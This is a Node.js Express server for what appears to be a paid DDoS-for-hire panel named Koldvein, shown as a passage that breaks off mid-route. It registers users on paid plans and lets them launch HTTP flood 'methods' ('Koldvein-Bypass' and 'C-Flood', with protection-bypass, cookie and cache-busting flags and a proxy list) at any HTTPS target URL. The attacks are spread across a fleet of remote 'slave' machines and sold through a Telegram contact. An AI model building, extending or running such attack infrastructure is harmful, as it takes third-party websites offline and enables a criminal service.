#!/usr/bin/env node
'use strict';

const fs       = require('node:fs');
const path     = require('node:path');
const crypto   = require('node:crypto');
const net      = require('node:net');
const https    = require('node:https');
const http     = require('node:http');
const readline = require('node:readline');
const express  = require('express');
const session  = require('express-session');
const rateLimit= require('express-rate-limit');
const helmet   = require('helmet');
const bcrypt   = require('bcryptjs');

const SELF_PATH  = fs.realpathSync(__filename);
const SCRIPT_DIR = path.dirname(SELF_PATH);

const CONFIG = Object.freeze({
  host: process.env.HUB_HOST || '0.0.0.0',
  port: Number(process.env.PORT || 3000),
  adminUsername: process.env.ADMIN_USERNAME || 'root',
  adminPasswordHash: process.env.ADMIN_PASSWORD_HASH || '',
  sessionSecret: process.env.SESSION_SECRET || 'change-me-' + crypto.randomBytes(16).toString('hex'),
  cookieSecure: String(process.env.COOKIE_SECURE || 'false') === 'true',
  minPasswordLength: 3,
  dataDir: path.join(SCRIPT_DIR, 'koldvein-data'),
  defaultCooldown: Number(process.env.DEFAULT_COOLDOWN || 20),
  hubDomain: process.env.HUB_DOMAIN || '',
  contactUrl: 'https://t.me/privflood',
  maxBatch: 20,
});

fs.mkdirSync(CONFIG.dataDir, { recursive: true, mode: 0o700 });

const USERS_FILE     = path.join(CONFIG.dataDir, 'users.json');
const AUDIT_FILE     = path.join(CONFIG.dataDir, 'audit.log');
const BLACKLIST_FILE = path.join(CONFIG.dataDir, 'blacklist.json');
const SESSIONS_FILE  = path.join(CONFIG.dataDir, 'sessions.json');
const GLOBAL_FILE    = path.join(CONFIG.dataDir, 'global.json');
for (const f of [USERS_FILE, BLACKLIST_FILE, SESSIONS_FILE])
  if (!fs.existsSync(f)) fs.writeFileSync(f, '[]\n', { mode: 0o600 });
if (!fs.existsSync(GLOBAL_FILE))
  fs.writeFileSync(GLOBAL_FILE, JSON.stringify({ maxRate: 0 }, null, 2) + '\n', { mode: 0o600 });

let _usersCache = null, _blacklistCache = null, _globalCache = null;
const _loadUsers     = () => { if (_usersCache) return _usersCache; try { _usersCache = JSON.parse(fs.readFileSync(USERS_FILE, 'utf8')); } catch { _usersCache = []; } return _usersCache; };
const _loadBlacklist = () => { if (_blacklistCache) return _blacklistCache; try { _blacklistCache = JSON.parse(fs.readFileSync(BLACKLIST_FILE, 'utf8')); } catch { _blacklistCache = []; } return _blacklistCache; };
const _loadGlobal    = () => { if (_globalCache) return _globalCache; try { const g = JSON.parse(fs.readFileSync(GLOBAL_FILE, 'utf8')); _globalCache = { maxRate: Number(g.maxRate) || 0 }; } catch { _globalCache = { maxRate: 0 }; } return _globalCache; };
const readUsers        = () => _loadUsers();
const readBlacklist    = () => _loadBlacklist();
const readGlobalLimits = () => _loadGlobal();

const _auditStream = fs.createWriteStream(AUDIT_FILE, { flags: 'a', mode: 0o600 });
function _atomicWrite(file, data, cb) {
  const tmp = file + '.' + process.pid + '.' + Date.now() + '.tmp';
  fs.writeFile(tmp, data, { mode: 0o600 }, err => {
    if (err) return cb && cb(err);
    fs.rename(tmp, file, err2 => cb && cb(err2));
  });
}
function writeUsers(users)         { _usersCache = users; _atomicWrite(USERS_FILE, JSON.stringify(users, null, 2) + '\n'); }
function writeBlacklist(list)      { _blacklistCache = list; _atomicWrite(BLACKLIST_FILE, JSON.stringify(list, null, 2) + '\n'); }
function writeGlobalLimits(obj)    { _globalCache = obj; _atomicWrite(GLOBAL_FILE, JSON.stringify(obj, null, 2) + '\n'); }
function readPersistedSessions()   { try { return JSON.parse(fs.readFileSync(SESSIONS_FILE, 'utf8')); } catch { return []; } }
function writePersistedSessions(l) { _atomicWrite(SESSIONS_FILE, JSON.stringify(l, null, 2) + '\n'); }
function audit(event, actor, details) {
  try { _auditStream.write(JSON.stringify({ at: new Date().toISOString(), event, actor: actor || 'system', details: details || {} }) + '\n'); } catch {}
}

function normalizeLimit(v, fallback) {
  if (v === undefined || v === null || v === '') return fallback;
  const n = Number(v);
  if (!Number.isFinite(n) || n < 0) return fallback;
  return Math.floor(n);
}
function unlimitedLimits() { return { maxDuration: 0, maxRate: 0, maxConcurrent: 0, cooldown: 0 }; }
function parseExpiry(input) {
  if (input === undefined || input === null || input === '' || input === 'never' || input === 0) return null;
  if (typeof input === 'number' && Number.isFinite(input) && input > 0) return new Date(Date.now() + input * 86400000).toISOString();
  const s = String(input).trim();
  const rel = s.match(/^(\d+)\s*d$/i);
  if (rel) return new Date(Date.now() + Number(rel[1]) * 86400000).toISOString();
  const t = Date.parse(s);
  return Number.isFinite(t) ? new Date(t).toISOString() : null;
}
function isExpired(user) {
  if (!user || user.role === 'admin') return false;
  if (!user.expiresAt) return false;
  const t = Date.parse(user.expiresAt);
  return Number.isFinite(t) && Date.now() > t;
}
function computePlanDaysRemaining(user) {
  if (!user || !user.expiresAt) return 0;
  const t = Date.parse(user.expiresAt);
  if (!Number.isFinite(t)) return 0;
  const ms = t - Date.now();
  return ms > 0 ? Math.ceil(ms / 86400000) : 0;
}
function safeUser(u) {
  const g = readGlobalLimits();
  if (u.role === 'admin') return {
    username: u.username, role: u.role, createdAt: u.createdAt, expiresAt: null,
    planName: 'Admin', planId: 'admin', planDays: 0, planDaysRemaining: 0,
    limits: unlimitedLimits(),
    effectiveLimits: { ...unlimitedLimits(), globalMaxRate: g.maxRate || 0 },
    globalCaps: g,
  };
  const planName = u.planName || (u.role === 'pending' ? 'Free Plan' : 'No Plan');
  const planDays = u.planDays || 0;
  const uR = normalizeLimit(u.maxRate, 0);
  const gR = Number(g.maxRate) > 0 ? Number(g.maxRate) : 0;
  const effRate = (uR === 0) ? gR : (gR === 0 ? uR : Math.min(uR, gR));
  const eff = {
    maxDuration: normalizeLimit(u.maxDuration, 0),
    maxRate: effRate,
    maxConcurrent: normalizeLimit(u.maxConcurrent, 0),
    cooldown: normalizeLimit(u.cooldown, 0),
    globalMaxRate: gR,
  };
  return {
    username: u.username, role: u.role, createdAt: u.createdAt,
    expiresAt: u.expiresAt || null, planName, planId: u.planId || null,
    planDays, planDaysRemaining: computePlanDaysRemaining(u),
    limits: eff, effectiveLimits: eff, globalCaps: g,
  };
}

function validUsername(s) { return typeof s === 'string' && /^[a-zA-Z0-9_.-]{3,32}$/.test(s); }
function validPassword(s) { return typeof s === 'string' && s.length >= CONFIG.minPasswordLength && s.length <= 200; }
function normalizeHost(raw) {
  let h = String(raw || '').trim().toLowerCase();
  h = h.replace(/^[a-z]+:\/\//, '').replace(/[/?#].*$/, '').replace(/:\d+$/, '').replace(/\.+$/, '');
  return h;
}
function validateTarget(raw) {
  let u;
  try { u = new URL(raw); } catch { throw new Error('Enter a valid HTTPS URL.'); }
  if (u.protocol !== 'https:') throw new Error('Only HTTPS targets are allowed.');
  return { url: raw, host: normalizeHost(u.hostname) };
}
function hostMatchesPattern(host, pattern) {
  const p = normalizeHost(pattern);
  if (!p) return false;
  const h = normalizeHost(host);
  if (!h) return false;
  if (p.startsWith('*.')) { const base = p.slice(2); return h === base || h.endsWith('.' + base); }
  return h === p;
}
function isBlacklisted(host) { return readBlacklist().some(e => hostMatchesPattern(host, e)); }

function tcpPing(host, port, timeoutMs) {
  return new Promise(resolve => {
    const start = Date.now();
    const socket = new net.Socket();
    let done = false;
    const fin = (ok, e) => { if (done) return; done = true; try { socket.destroy(); } catch {} resolve({ ok, ms: Date.now() - start, error: e || null }); };
    socket.setTimeout(timeoutMs);
    socket.once('connect', () => fin(true));
    socket.once('timeout', () => fin(false, 'timeout'));
    socket.once('error', e => fin(false, e.code || e.message));
    try { socket.connect(port, host); } catch (e) { fin(false, e.message); }
  });
}
async function runServerPing(host) {
  const COUNT = 5, TIMEOUT = 2500;
  const probe443 = await tcpPing(host, 443, TIMEOUT);
  const port = probe443.ok ? 443 : 80;
  const results = port === 443 ? [probe443] : [];
  while (results.length < COUNT) {
    results.push(await tcpPing(host, port, TIMEOUT));
    if (results.length < COUNT) await new Promise(r => setTimeout(r, 800));
  }
  const received = results.filter(r => r.ok).length;
  const times = results.filter(r => r.ok).map(r => r.ms);
  return {
    host, port, count: COUNT, received, lost: COUNT - received,
    lossPercent: Math.round(((COUNT - received) / COUNT) * 100),
    min: times.length ? Math.min(...times) : 0,
    max: times.length ? Math.max(...times) : 0,
    avg: times.length ? Math.round(times.reduce((a, b) => a + b, 0) / times.length) : 0,
    results,
  };
}
function checkHttpsUrl(host, timeoutMs) {
  return new Promise(resolve => {
    const start = Date.now();
    let done = false;
    const fin = (ok, status, e) => { if (done) return; done = true; resolve({ ok, status, ms: Date.now() - start, error: e || null }); };
    let req;
    try {
      req = https.request({ host, port: 443, method: 'HEAD', path: '/', timeout: timeoutMs, rejectUnauthorized: false,
        headers: { 'User-Agent': 'Koldvein-Status/1', 'Accept': '*/*' } },
        res => { res.resume(); fin(true, res.statusCode); });
    } catch (e) { return fin(false, 0, e.message); }
    req.on('timeout', () => { try { req.destroy(); } catch {} fin(false, 0, 'timeout'); });
    req.on('error', e => fin(false, 0, e.code || e.message));
    req.end();
  });
}
function httpGetJson(url, timeoutMs) {
  return new Promise((resolve, reject) => {
    let req;
    try {
      const u = new URL(url);
      const lib = u.protocol === 'https:' ? https : http;
      req = lib.get({
        host: u.hostname, port: u.port || (u.protocol === 'https:' ? 443 : 80),
        path: u.pathname + u.search, timeout: timeoutMs,
        headers: { 'User-Agent': 'Koldvein-ASN/1', 'Accept': 'application/json' },
      }, r => {
        let buf = '';
        r.on('data', c => buf += c);
        r.on('end', () => { try { resolve(JSON.parse(buf)); } catch { reject(new Error('bad JSON')); } });
      });
    } catch (e) { return reject(e); }
    req.on('timeout', () => { try { req.destroy(); } catch {} reject(new Error('timeout')); });
    req.on('error', reject);
  });
}

/* ---------- METHOD DEFINITIONS ---------- */
const METHODS = [
  {
    id: 'koldvein',
    name: 'Koldvein-Bypass',
    file: 'K0ldvein.js',
    flags: { bypass: true, cookies: true, headers: false, cache: false },
    buildArgs(opts) {
      const a = [String(opts.target), String(opts.duration), 'ppp.txt', String(opts.threads), String(opts.rate)];
      if (opts.bypass)  a.push('-bypass');
      if (opts.cookies) a.push('-c');
      a.push('-s');
      return a;
    },
  },
  {
    id: 'cflood',
    name: 'C-Flood',
    file: 'c-rush.js',
    flags: { bypass: false, cookies: true, headers: true, cache: true },
    buildArgs(opts) {
      const a = [String(opts.target), String(opts.duration), 'ppp.txt', String(opts.threads), String(opts.rate)];
      if (opts.cookies) a.push('-c');
      if (opts.headers) a.push('-h');
      if (opts.cache)   a.push('-ch', 'true');
      a.push('-s');
      return a;
    },
  },
];

function resolveMethodFile(fileName) {
  const p = path.join(SCRIPT_DIR, fileName);
  try {
    if (fs.existsSync(p)) {
      const st = fs.statSync(p);
      if (st.isFile()) return { exists: true, path: p, size: st.size };
    }
  } catch (e) {
    return { exists: false, path: p, error: e.message };
  }
  /* case-insensitive fallback */
  try {
    const dir = fs.readdirSync(SCRIPT_DIR);
    const lower = fileName.toLowerCase();
    const match = dir.find(f => f.toLowerCase() === lower);
    if (match) {
      const mp = path.join(SCRIPT_DIR, match);
      const st = fs.statSync(mp);
      if (st.isFile()) return { exists: true, path: mp, size: st.size, note: 'case-insensitive: ' + match };
    }
  } catch (e) {}
  return { exists: false, path: p };
}

function logMethodCheck() {
  console.log('[methods] checking method files in: ' + SCRIPT_DIR);
  for (const m of METHODS) {
    const r = resolveMethodFile(m.file);
    if (r.exists) {
      console.log('[methods]   [OK]      ' + m.id.padEnd(10) + ' → ' + r.path + ' (' + r.size + ' bytes)' + (r.note ? '  [' + r.note + ']' : ''));
    } else {
      console.log('[methods]   [MISSING] ' + m.id.padEnd(10) + ' → ' + r.path);
    }
  }
}
logMethodCheck();

function getMethodById(id) { return METHODS.find(m => m.id === id); }
function getMethodStatus() {
  return METHODS.map(m => {
    const r = resolveMethodFile(m.file);
    return {
      id: m.id,
      name: m.name,
      file: m.file,
      available: r.exists,
      size: r.exists ? r.size : 0,
      path: r.path,
      reason: r.exists ? null : (m.file + ' not found in hub directory'),
    };
  });
}

const app = express();
app.disable('x-powered-by');
app.set('trust proxy', 1);

app.use(helmet({
  contentSecurityPolicy: { directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "'unsafe-inline'", "https://telegram.org"],
    styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
    fontSrc: ["'self'", "https://fonts.gstatic.com"],
    imgSrc: ["'self'", 'data:', 'https:'],
    connectSrc: ["'self'"],
    objectSrc: ["'none'"],
    frameAncestors: ["'self'", "https://web.telegram.org", "https://*.telegram.org"],
    upgradeInsecureRequests: null,
  }},
  crossOriginEmbedderPolicy: false, crossOriginResourcePolicy: false, crossOriginOpenerPolicy: false,
}));

app.use(express.json({ limit: '128kb' }));
app.use(express.urlencoded({ extended: false, limit: '128kb' }));

app.use(session({
  name: 'koldvein.sid', secret: CONFIG.sessionSecret, resave: false, saveUninitialized: false, proxy: true,
  cookie: { httpOnly: true, sameSite: CONFIG.cookieSecure ? 'none' : 'lax', secure: CONFIG.cookieSecure, maxAge: 7 * 86400000 },
}));

app.use('/api/', rateLimit({ windowMs: 60000, limit: 300, standardHeaders: true, legacyHeaders: false }));

const paymentsInit = fs.existsSync(path.join(SCRIPT_DIR, 'payments.js')) ? require(path.join(SCRIPT_DIR, 'payments.js')) : null;
const initSlaves   = require('./slaves.js');
const initBackup   = require('./backup.js');

const sessions  = new Map();
const cooldowns = new Map();

function persistSessions() {
  const dump = [];
  for (const s of sessions.values()) {
    if (s.status === 'terminating') continue;
    dump.push({
      id: s.id, target: s.target, duration: s.duration,
      rate: s.rate, bypass: s.bypass, cookies: s.cookies,
      headers: s.headers || false, cache: s.cache || false,
      method: s.method || 'koldvein',
      methodName: s.methodName || 'Koldvein-Bypass',
      startedAt: s.startedAt, status: s.status, owner: s.owner,
      error: s.error || null, command: s.command || '',
      concurrent: s.concurrent || 1,
      batchId: s.batchId || null,
      pendingSlave: s.pendingSlave || null,
      slaves: (s.slaves || []).map(x => ({
        slaveId: x.slaveId, slaveName: x.slaveName, pid: x.pid,
        threads: x.threads, cores: x.cores, log: x.log, sid: x.sid,
      })),
    });
  }
  writePersistedSessions(dump);
}

function setCooldown(username, seconds) {
  if (!seconds || seconds <= 0) return;
  cooldowns.set(username, { until: Date.now() + seconds * 1000 });
}
function getCooldownRemaining(username) {
  const c = cooldowns.get(username);
  if (!c) return 0;
  const r = c.until - Date.now();
  if (r <= 0) { cooldowns.delete(username); return 0; }
  return Math.ceil(r / 1000);
}

function auth(req, res, next) {
  if (!req.session.user) return res.status(401).json({ error: 'Sign in required.' });
  const currentIp = req.ip || '';
  if (req.session.ip && req.session.ip !== currentIp) {
    return req.session.destroy(() => res.status(401).json({ error: 'Network changed. Sign in again.' }));
  }
  const users = readUsers();
  const u = users.find(x => x.username === req.session.user.username);
  if (!u) return req.session.destroy(() => res.status(401).json({ error: 'Account gone.' }));
  if (isExpired(u)) return req.session.destroy(() => res.status(401).json({ error: 'Account expired.' }));
  req.session.user = safeUser(u);
  next();
}
function admin(req, res, next) {
  if (!req.session.user || req.session.user.role !== 'admin') return res.status(403).json({ error: 'Admin only.' });
  next();
}

const slaves = initSlaves({
  DATA_DIR: CONFIG.dataDir,
  SCRIPT_DIR,
  audit,
  notifyBot: payload => {
    if (!process.env.BOT_NOTIFY_SECRET) return;
    const body = JSON.stringify(payload || {});
    const req = http.request({
      host: process.env.BOT_NOTIFY_HOST || '127.0.0.1',
      port: Number(process.env.BOT_NOTIFY_PORT || 3099),
      path: '/internal/notify', method: 'POST', timeout: 4000,
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(body),
        'X-Notify-Secret': process.env.BOT_NOTIFY_SECRET,
      },
    }, r => r.resume());
    req.on('timeout', () => { try { req.destroy(); } catch {} });
    req.on('error', () => {});
    req.end(body);
  },
});

const backup = initBackup({ DATA_DIR: CONFIG.dataDir });

let paymentsModule = null;
if (paymentsInit) {
  try {
    paymentsModule = paymentsInit({
      SCRIPT_DIR, CONFIG, USERS_FILE, DATA_DIR: CONFIG.dataDir,
      readUsers, writeUsers, audit, safeUser, app, auth, admin, express,
    });
    console.log('[payments] loaded');
  } catch (e) { console.error('[payments] init failed:', e.message); }
}

function busySlaveIds() {
  const busy = new Set();
  for (const s of sessions.values()) {
    if (s.status !== 'running' && s.status !== 'launching' && s.status !== 'terminating') continue;
    for (const x of (s.slaves || [])) busy.add(x.slaveId);
    if (s.pendingSlave) busy.add(s.pendingSlave);
  }
  return busy;
}

function pickSlaveForSession() {
  const ready = slaves.getReadySlaves();
  if (!ready.length) return null;
  const busy = busySlaveIds();
  const idle = ready.filter(s => !busy.has(s.id));
  if (!idle.length) return null;
  idle.sort((a, b) => b.cores - a.cores);
  return idle[0];
}

function countIdleSlaves() {
  const ready = slaves.getReadySlaves();
  const busy = busySlaveIds();
  return ready.filter(s => !busy.has(s.id)).length;
}

function viewSession(s) {
  const elapsed = s.status === 'launching' ? 0 : Math.floor((Date.now() - s.startedAt) / 1000);
  const shown   = s.status === 'done' ? s.duration : Math.min(elapsed, s.duration);
  const totalThreads = (s.slaves || []).reduce((a, x) => a + (x.threads || 0), 0);
  const totalCores   = (s.slaves || []).reduce((a, x) => a + (x.cores   || 0), 0);
  return {
    id: s.id, target: s.target, duration: s.duration,
    method: s.method || 'koldvein',
    methodName: s.methodName || 'Koldvein-Bypass',
    startedAt: s.startedAt, elapsedSeconds: shown,
    status: s.status, owner: s.owner, error: s.error || null,
    rate: s.rate, bypass: s.bypass, cookies: s.cookies,
    headers: s.headers || false, cache: s.cache || false,
    concurrent: s.concurrent || 1,
    batchId: s.batchId || null,
    slaveCount: (s.slaves || []).length, totalCores, totalThreads,
    command: s.command || '',
  };
}

async function killSessionOnSlaves(session) {
  for (const s of (session.slaves || [])) {
    try { await slaves.stopProcess(s.slaveId, s.pid); } catch (e) { console.error('[stop]', e.message); }
  }
}

async function stopSession(id, reason) {
  const s = sessions.get(id);
  if (!s) return false;
  try {
    clearTimeout(s.timer);
    clearInterval(s.checkTimer);

    if (reason === 'duration_expired') {
      s.status = 'done';
      setTimeout(() => { sessions.delete(id); persistSessions(); }, 15000).unref();
      killSessionOnSlaves(s).catch(e => console.error('[kill]', e.message));
    } else {
      s.status = 'terminating';
      if (s.owner) {
        const users = readUsers();
        const u = users.find(x => x.username === s.owner);
        if (u && u.role !== 'admin') {
          const cd = normalizeLimit(u.cooldown, 0);
          if (cd > 0) setCooldown(s.owner, cd);
        }
      }
      killSessionOnSlaves(s)
        .catch(e => console.error('[kill]', e.message))
        .finally(() => { sessions.delete(id); persistSessions(); });
      setTimeout(() => {
        if (sessions.has(id)) { sessions.delete(id); persistSessions(); }
      }, 30000).unref();
    }
    persistSessions();
    audit('process_stop_requested', s.owner, { id, reason: reason || 'manual' });
  } catch (e) { console.error('[stopSession]', e); }
  return true;
}

function startLivenessPoller(sessionId) {
  let misses = 0;
  const session = sessions.get(sessionId);
  if (!session) return;
  session.checkTimer = setInterval(async () => {
    const cur = sessions.get(sessionId);
    if (!cur || cur.status !== 'running') return;
    const checks = await Promise.allSettled(
      (cur.slaves || []).map(x => Promise.race([
        slaves.checkProcess(x.slaveId, x.pid),
        new Promise(r => setTimeout(() => r({ alive: true, timeout: true }), 10000)),
      ]))
    );
    const anyAlive = checks.some(r => r.status === 'fulfilled' && r.value.alive);
    if (anyAlive) { misses = 0; return; }
    misses++;
    if (misses < 3) return;
    clearTimeout(cur.timer);
    clearInterval(session.checkTimer);
    cur.status = 'done';
    setTimeout(() => { sessions.delete(sessionId); persistSessions(); }, 15000).unref();
    persistSessions();
  }, 12000);
  session.checkTimer.unref();
}

async function reattachSessions() {
  const list = readPersistedSessions();
  const now = Date.now();
  let attached = 0;
  for (const rec of list) {
    if (!rec || !rec.slaves || !rec.slaves.length) continue;
    const elapsedMs = now - rec.startedAt;
    if (elapsedMs >= rec.duration * 1000) continue;
    let anyAlive = false;
    for (const s of rec.slaves) {
      try { const r = await slaves.checkProcess(s.slaveId, s.pid); if (r.alive) { anyAlive = true; break; } } catch {}
    }
    if (!anyAlive) continue;
    const sessionObj = {
      id: rec.id, target: rec.target, duration: rec.duration,
      rate: rec.rate, bypass: rec.bypass, cookies: rec.cookies,
      headers: rec.headers || false, cache: rec.cache || false,
      method: rec.method || 'koldvein',
      methodName: rec.methodName || 'Koldvein-Bypass',
      startedAt: rec.startedAt, status: 'running', owner: rec.owner,
      slaves: rec.slaves, command: rec.command || '',
      concurrent: rec.concurrent || 1, batchId: rec.batchId || null,
    };
    sessions.set(rec.id, sessionObj);
    const remaining = rec.duration * 1000 - elapsedMs;
    sessionObj.timer = setTimeout(() => stopSession(rec.id, 'duration_expired'), Math.max(0, remaining));
    sessionObj.timer.unref();
    startLivenessPoller(rec.id);
    attached++;
  }
  if (attached > 0) { console.log('[hub] reattached ' + attached + ' session(s)'); persistSessions(); }
}

const FAVICON_PATH = path.join(SCRIPT_DIR, 'fav.png');
let faviconBuffer = null;
try {
  faviconBuffer = fs.readFileSync(FAVICON_PATH);
  console.log('[hub] favicon loaded (' + faviconBuffer.length + 'B)');
} catch (e) {
  console.warn('[hub] fav.png NOT FOUND at ' + FAVICON_PATH);
}
function serveFavicon(req, res) {
  if (!faviconBuffer) { res.status(404).end(); return; }
  res.set({
    'Content-Type': 'image/png',
    'Content-Length': String(faviconBuffer.length),
    'Cache-Control': 'public, max-age=3600',
  });
  res.end(faviconBuffer);
}
app.get('/fav.png',      serveFavicon);
app.get('/favicon.png',  serveFavicon);
app.get('/favicon.ico',  serveFavicon);

app.get('/api/health', (_req, res) => res.json({ ok: true, slaves: slaves.listSlaves().length }));

app.get('/api/captcha', (req, res) => {
  const a = Math.floor(Math.random() * 20) + 1;
  const b = Math.floor(Math.random() * 20) + 1;
  req.session.captcha = { answer: a + b, expires: Date.now() + 600000 };
  res.json({ question: a + ' + ' + b });
});
function verifyCaptcha(req) {
  const ans = Number((req.body || {}).captchaAnswer);
  const c = req.session.captcha;
  if (!c || Date.now() > c.expires) throw new Error('Captcha expired.');
  if (!Number.isFinite(ans) || ans !== c.answer) { delete req.session.captcha; throw new Error('Wrong captcha.'); }
  delete req.session.captcha;
}

app.get('/api/methods', auth, (_req, res) => {
  res.json({
    methods: getMethodStatus(),
    scriptDir: SCRIPT_DIR,
  });
});

app.post('/api/register', async (req, res) => {
  const { username, password } = req.body || {};
  try { verifyCaptcha(req); } catch (e) { return res.status(400).json({ error: e.message }); }
  if (!validUsername(username)) return res.status(400).json({ error: 'Invalid username.' });
  if (!validPassword(password)) return res.status(400).json({ error: 'Password too short.' });
  const users = readUsers();
  if (users.some(u => u.username.toLowerCase() === username.toLowerCase())) return res.status(409).json({ error: 'Username taken.' });
  const u = {
    username, passwordHash: await bcrypt.hash(password, 12),
    role: 'pending', createdAt: new Date().toISOString(),
    expiresAt: null, maxDuration: 0, maxRate: 0, maxConcurrent: 0,
    cooldown: CONFIG.defaultCooldown, planName: 'Free Plan',
  };
  users.push(u); writeUsers(users); audit('user_registered', username, { role: 'pending' });
  const bindIp = req.ip || '';
  req.session.regenerate(err => {
    if (err) return res.status(500).json({ error: 'Session error.' });
    req.session.user = safeUser(u);
    req.session.ip = bindIp;
    req.session.save(() => res.status(201).json({ user: req.session.user }));
  });
});

app.post('/api/login', async (req, res) => {
  const { username, password } = req.body || {};
  try { verifyCaptcha(req); } catch (e) { return res.status(400).json({ error: e.message }); }
  if (typeof username !== 'string' || typeof password !== 'string') return res.status(400).json({ error: 'Missing creds.' });
  let users = readUsers();
  let u = users.find(x => x.username.toLowerCase() === username.toLowerCase());
  if (!u && username === CONFIG.adminUsername && CONFIG.adminPasswordHash && await bcrypt.compare(password, CONFIG.adminPasswordHash)) {
    u = { username: CONFIG.adminUsername, passwordHash: CONFIG.adminPasswordHash, role: 'admin', createdAt: new Date().toISOString(), expiresAt: null };
    users.push(u); writeUsers(users);
  }
  if (!u || !(await bcrypt.compare(password, u.passwordHash))) {
    audit('login_failed', username);
    return res.status(401).json({ error: 'Bad credentials.' });
  }
  if (isExpired(u)) return res.status(403).json({ error: 'Account expired.' });
  const bindIp = req.ip || '';
  req.session.regenerate(err => {
    if (err) return res.status(500).json({ error: 'Session error.' });
    req.session.user = safeUser(u);
    req.session.ip = bindIp;
    req.session.save(() => { audit('login_success', u.username); res.json({ user: req.session.user }); });
  });
});

app.get('/api/me', auth, (req, res) => res.json({ user: req.session.user }));
app.post('/api/logout', auth, (req, res) => { req.session.destroy(() => res.json({ ok: true })); });

app.post('/api/account', auth, async (req, res) => {
  const { currentPassword, newUsername, newPassword } = req.body || {};
  const users = readUsers();
  const i = users.findIndex(u => u.username === req.session.user.username);
  if (i < 0 || !(await bcrypt.compare(String(currentPassword || ''), users[i].passwordHash)))
    return res.status(400).json({ error: 'Wrong password.' });
  const changes = [];
  if (newUsername) {
    if (!validUsername(newUsername)) return res.status(400).json({ error: 'Invalid username.' });
    if (users.some((u, j) => j !== i && u.username.toLowerCase() === newUsername.toLowerCase()))
      return res.status(409).json({ error: 'Taken.' });
    users[i].username = newUsername; changes.push('username');
  }
  if (newPassword) {
    if (!validPassword(newPassword)) return res.status(400).json({ error: 'Bad password.' });
    users[i].passwordHash = await bcrypt.hash(newPassword, 12); changes.push('password');
  }
  writeUsers(users);
  req.session.user = safeUser(users[i]);
  audit('account_updated', users[i].username, { changes });
  res.json({ user: req.session.user, notification: 'Updated: ' + changes.join(' & ') });
});

app.get('/api/users', auth, admin, (_req, res) => res.json({ users: readUsers().map(safeUser) }));

app.post('/api/users', auth, admin, async (req, res) => {
  const body = req.body || {};
  const { username, password } = body;
  if (!validUsername(username)) return res.status(400).json({ error: 'Invalid username.' });
  if (!validPassword(password)) return res.status(400).json({ error: 'Password too short.' });
  const maxDuration = normalizeLimit(body.maxDuration, 0);
  const maxRate = normalizeLimit(body.maxRate, 0);
  const maxConcurrent = normalizeLimit(body.maxConcurrent, 0);
  const cooldown = normalizeLimit(body.cooldown, CONFIG.defaultCooldown);
  const expiresAt = parseExpiry(body.expiresAt);
  const role = ['pending','user','admin'].includes(body.role) ? body.role : 'user';
  const users = readUsers();
  if (users.some(u => u.username.toLowerCase() === username.toLowerCase())) return res.status(409).json({ error: 'Exists.' });
  const u = {
    username, passwordHash: await bcrypt.hash(password, 12), role,
    createdAt: new Date().toISOString(), expiresAt,
    maxDuration, maxRate, maxConcurrent, cooldown,
    planName: role === 'pending' ? 'Free Plan' : 'Manual Plan',
  };
  users.push(u); writeUsers(users);
  audit('user_created', req.session.user.username, { username, role });
  res.status(201).json({ user: safeUser(u) });
});

app.put('/api/users/:username', auth, admin, async (req, res) => {
  const target = req.params.username;
  const users = readUsers();
  const i = users.findIndex(u => u.username === target);
  if (i < 0) return res.status(404).json({ error: 'Not found.' });
  if (users[i].role === 'admin' && target !== req.session.user.username) return res.status(403).json({ error: 'Cannot modify another admin.' });
  const body = req.body || {};
  if (body.maxDuration !== undefined)   users[i].maxDuration   = normalizeLimit(body.maxDuration, 0);
  if (body.maxRate !== undefined)       users[i].maxRate       = normalizeLimit(body.maxRate, 0);
  if (body.maxConcurrent !== undefined) users[i].maxConcurrent = normalizeLimit(body.maxConcurrent, 0);
  if (body.cooldown !== undefined)      users[i].cooldown      = normalizeLimit(body.cooldown, CONFIG.defaultCooldown);
  if (body.expiresAt !== undefined)     users[i].expiresAt     = parseExpiry(body.expiresAt);
  if (body.role !== undefined && ['pending','user','admin'].includes(body.role)) users[i].role = body.role;
  if (body.password) users[i].passwordHash = await bcrypt.hash(body.password, 12);
  writeUsers(users);
  audit('user_updated', req.session.user.username, { username: target });
  res.json({ user: safeUser(users[i]) });
});

app.delete('/api/users/:username', auth, admin, (req, res) => {
  const target = req.params.username;
  if (target === req.session.user.username) return res.status(400).json({ error: 'Cannot delete yourself.' });
  const users = readUsers();
  const i = users.findIndex(u => u.username === target);
  if (i < 0) return res.status(404).json({ error: 'Not found.' });
  if (users[i].role === 'admin') return res.status(403).json({ error: 'Cannot delete admin.' });
  users.splice(i, 1); writeUsers(users);
  audit('user_deleted', req.session.user.username, { username: target });
  res.json({ ok: true });
});

app.get('/api/admin/global-limits', auth, admin, (_req, res) => {
  const g = readGlobalLimits();
  res.json({ maxRate: g.maxRate || 0 });
});
app.put('/api/admin/global-limits', auth, admin, (req, res) => {
  const maxRate = normalizeLimit((req.body || {}).maxRate, 0);
  writeGlobalLimits({ maxRate });
  audit('global_limits_updated', req.session.user.username, { maxRate });
  res.json({ ok: true, maxRate });
});

app.get('/api/blacklist', auth, admin, (_req, res) => res.json({ blacklist: readBlacklist() }));
app.post('/api/blacklist', auth, admin, (req, res) => {
  const pattern = normalizeHost((req.body || {}).pattern);
  if (!pattern) return res.status(400).json({ error: 'Required.' });
  if (!/^(\*\.)?[a-z0-9-]+(\.[a-z0-9-]+)*\.[a-z]{2,}$/.test(pattern)) return res.status(400).json({ error: 'Invalid pattern.' });
  const list = readBlacklist();
  if (list.includes(pattern)) return res.status(409).json({ error: 'Exists.' });
  list.push(pattern); writeBlacklist(list);
  audit('blacklist_added', req.session.user.username, { pattern });
  res.status(201).json({ blacklist: list });
});
app.delete('/api/blacklist/:pattern', auth, admin, (req, res) => {
  const pattern = normalizeHost(req.params.pattern);
  const list = readBlacklist();
  const i = list.indexOf(pattern);
  if (i < 0) return res.status(404).json({ error: 'Not found.' });
  list.splice(i, 1); writeBlacklist(list);
  audit('blacklist_removed', req.session.user.username, { pattern });
  res.json({ blacklist: list });
});

app.get('/api/admin/slaves', auth, admin, (_req, res) => {
  const list = slaves.listSlaves();
  const ready = list.filter(s => s.status === 'ready');
  res.json({
    slaves: list,
    counts: {
      total: list.length, ready: ready.length,
      failed: list.filter(s => s.status === 'failed' || s.status === 'offline' || s.status === 'unhealthy').length,
    },
